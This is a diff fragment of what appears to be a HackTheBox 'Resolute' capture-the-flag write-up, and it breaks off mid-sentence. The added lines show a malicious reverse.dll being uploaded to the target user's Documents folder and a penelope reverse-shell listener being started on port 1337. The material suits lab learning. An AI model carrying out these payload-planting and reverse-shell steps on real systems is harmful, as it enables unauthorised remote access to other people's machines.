@@ -292,6 +292,20 @@ Saved as: reverse.dll
 Ill generate a payload
 
 ```python
-
+upload /home/kali/htb/resolute/reverse.dll
+                                        
+Info: Uploading /home/kali/htb/resolute/reverse.dll to C:\Users\ryan\Documents\reverse.dll
+                                        
+Data: 12288 bytes of 12288 bytes copied
+                                        
+Info: Upload successful!
 ```
+Uploaded it to the target 
+
+```python
+penelope -p 1337                                     
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Then i
 
